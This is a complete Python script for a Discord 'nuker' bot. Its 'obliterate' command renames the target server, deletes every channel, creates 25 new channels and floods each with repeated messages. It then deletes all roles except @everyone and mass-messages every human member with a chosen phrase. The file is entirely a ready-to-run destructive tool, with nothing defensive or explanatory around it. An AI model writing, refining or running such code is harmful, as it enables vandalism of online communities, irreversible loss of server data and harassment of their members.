import discord
from discord.ext import commands
import os
import asyncio

ascii_art = """
  __________  ____  _____ 
 /_  __/ __ \/ __ \/ ___/
  / / / / / / /_/ /\__ \ 
 / / / /_/ / _, _/___/ / 
/_/  \____/_/ |_|/____/  
(command : obliterate)
"""

def print_centered(text):
    columns = os.get_terminal_size().columns
    for line in text.splitlines():
        print(line.center(columns))

print_centered(ascii_art)

TOKEN = input("bot token : ")

PREFIX = input("command prefix : ")

channel_name = input("channel name : ")

message_text = input("channel message :  ")

rename_server = input("rename server? (yes/no) : ").lower()
if rename_server == "yes":
    
    new_server_name = input("enter server name : ")
else:
    new_server_name = None

dm_phrase = input("enter dm phrase :  ")

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.emojis = True
intents.message_content = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} is connected")

@bot.command()
async def obliterate(ctx):
    guild = ctx.guild

    if new_server_name:
        try:
            await guild.edit(name=new_server_name)
        except Exception as e:
            print(f"[!] failed to rename server {e}")

    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"[!] failed to delete channels {channel.name}: {e}")

    new_channels = []
    for _ in range(25):
        new_channel = await guild.create_text_channel(channel_name)
        new_channels.append(new_channel)

    async def send_messages(channel):
        for _ in range(15):
            await channel.send(message_text)

    tasks = [send_messages(channel) for channel in new_channels]
    await asyncio.gather(*tasks)

    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except Exception as e:
                print(f"[!] failed to delete roles {role.name}: {e}")

    for member in guild.members:
        if not member.bot:
            try:
                await member.send(dm_phrase)
            except Exception as e:
                print(f"[!] failed to dm members {member.name}: {e}")

    if new_channels:
        await new_channels[0].send("** **")

bot.run(TOKEN)
